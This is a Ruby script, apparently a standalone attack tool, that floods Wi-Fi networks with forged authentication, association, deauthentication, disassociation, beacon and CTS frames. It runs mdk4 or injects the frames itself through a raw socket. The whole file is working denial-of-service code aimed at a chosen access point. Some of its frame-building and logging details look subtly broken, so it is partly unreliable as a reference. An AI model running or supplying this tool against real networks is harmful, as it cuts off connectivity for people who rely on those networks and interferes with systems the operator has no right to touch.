#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'
require 'socket'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

ATTACK_TYPES = %w[auth-flood assoc-flood deauth-flood disassoc-flood beacon-flood cts-flood].freeze

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def random_mac
  '%02x:%02x:%02x:%02x:%02x:%02x' % [rand(256), rand(256), rand(256), rand(256), rand(256), rand(256)]
end

def build_auth_frame(bssid, client, seq)
  fc = [0xb0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = bssid
  addr2 = client
  addr3 = bssid
  sc = [seq << 4].pack('v')
  body = [0, 0, 1, 0].pack('v*')
  fc + dur + addr1 + addr2 + addr3 + sc + body
end

def build_assoc_frame(bssid, client, seq)
  fc = [0x10, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = bssid
  addr2 = client
  addr3 = bssid
  sc = [seq << 4].pack('v')
  body = [0, 0].pack('v*') + [1].pack('C') + [8].pack('C') + [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24].pack('C*')
  fc + dur + addr1 + addr2 + addr3 + sc + body
end

def build_deauth_frame(bssid, client, seq, reason)
  fc = [0xc0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = client
  addr2 = bssid
  addr3 = bssid
  sc = [seq << 4].pack('v')
  reason_code = [reason].pack('v')
  fc + dur + addr1 + addr2 + addr3 + sc + reason_code
end

def build_disassoc_frame(bssid, client, seq, reason)
  fc = [0xa0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = client
  addr2 = bssid
  addr3 = bssid
  sc = [seq << 4].pack('v')
  reason_code = [reason].pack('v')
  fc + dur + addr1 + addr2 + addr3 + sc + reason_code
end

def build_beacon_frame(bssid, ssid, seq, channel)
  fc = [0x80, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = "\xff\xff\xff\xff\xff\xff"
  addr2 = bssid
  addr3 = bssid
  sc = [seq << 4].pack('v')
  body = [0].pack('Q>') + [100].pack('v')
  body << [0].pack('C') + [ssid.bytesize].pack('C') + ssid
  body << [1].pack('C') + [8].pack('C') + [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24].pack('C*')
  body << [3].pack('C') + [1].pack('C') + [channel].pack('C')
  fc + dur + addr1 + addr2 + addr3 + sc + body
end

def build_cts_frame(bssid, seq)
  fc = [0xc4, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  addr1 = bssid
  sc = [seq << 4].pack('v')
  fc + dur + addr1 + sc
end

def send_frame(sock, ifidx, frame)
  addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
  sock.send(frame, 0, addr)
end

def run_mdk4_attack(attack_type, iface, target, count)
  mdk4 = `which mdk4 2>/dev/null`.strip
  return nil if mdk4.empty?

  cmd = case attack_type
        when 'auth-flood' then [mdk4, iface, 'a', '-a', target, '-s', count.to_s]
        when 'deauth-flood' then [mdk4, iface, 'd', '-a', target, '-c', count.to_s]
        when 'beacon-flood' then [mdk4, iface, 'b', '-t', target, '-c', count.to_s]
        when 'assoc-flood' then [mdk4, iface, 'a', '-a', target, '-i', '00:00:00:00:00:00', '-s', count.to_s]
        when 'disassoc-flood' then [mdk4, iface, 'd', '-a', target, '-c', count.to_s]
        when 'cts-flood' then [mdk4, iface, 'c', '-a', target]
        else nil
        end

  return nil unless cmd

  emit('mdk4_launch', iface, target, '', 0, { command: cmd.join(' ') })

  Open3.popen3(*cmd) do |stdin, stdout, stderr, thread|
    stdin.close
    [stdout, stderr].each do |r|
      Thread.new do
        r.each_line do |line|
          emit('mdk4_output', iface, target, '', 0, { line: line.strip, attack_type: attack_type })
        end
      end
    end
    thread.join
  end
end

begin
  iface = ARGV[0]
  attack_type = ARGV[1]
  target = ARGV[2] || 'ff:ff:ff:ff:ff:ff'
  count = (ARGV[3] || '1000').to_i

  raise 'interface required' unless iface
  raise "attack_type required; one of #{ATTACK_TYPES.join(', ')}" unless attack_type && ATTACK_TYPES.include?(attack_type)

  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  emit('dos_attack_start', iface, target, '', 0, { attack_type: attack_type, count: count })

  mdk4_used = run_mdk4_attack(attack_type, iface, target, count)
  if mdk4_used.nil?
    emit('manual_injection', iface, target, '', 0, { attack_type: attack_type, count: count })

    sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
    target_bin = mac2bin(target)

    case attack_type
    when 'auth-flood'
      emit('auth_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        client = mac2bin(random_mac)
        frame = build_auth_frame(target_bin, client, i % 4096)
        send_frame(sock, ifidx, frame)
        emit('auth_frame_sent', iface, target, '', 0, { seq: i, client: random_mac })
      end

    when 'assoc-flood'
      emit('assoc_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        client = mac2bin(random_mac)
        frame = build_assoc_frame(target_bin, client, i % 4096)
        send_frame(sock, ifidx, frame)
        emit('assoc_frame_sent', iface, target, '', 0, { seq: i, client: random_mac })
      end

    when 'deauth-flood'
      emit('deauth_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        client = mac2bin(random_mac)
        frame = build_deauth_frame(target_bin, client, i % 4096, 7)
        send_frame(sock, ifidx, frame)
        emit('deauth_frame_sent', iface, target, '', 0, { seq: i, client: random_mac })
      end

    when 'disassoc-flood'
      emit('disassoc_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        client = mac2bin(random_mac)
        frame = build_disassoc_frame(target_bin, client, i % 4096, 8)
        send_frame(sock, ifidx, frame)
        emit('disassoc_frame_sent', iface, target, '', 0, { seq: i, client: random_mac })
      end

    when 'beacon-flood'
      emit('beacon_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        bssid = mac2bin(random_mac)
        ssid = "FakeAP_#{i % 100}"
        frame = build_beacon_frame(bssid, ssid, i % 4096, 6)
        send_frame(sock, ifidx, frame)
        emit('beacon_frame_sent', iface, random_mac, ssid, 6, { seq: i })
      end

    when 'cts-flood'
      emit('cts_flood_start', iface, target, '', 0, { count: count })
      count.times do |i|
        frame = build_cts_frame(target_bin, i % 4096)
        send_frame(sock, ifidx, frame)
        emit('cts_frame_sent', iface, target, '', 0, { seq: i })
      end
    end

    sock.close
  end

  emit('dos_attack_complete', iface, target, '', 0, { attack_type: attack_type, count: count })

rescue Interrupt
  emit('dos_attack_interrupted', iface || '', target || '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
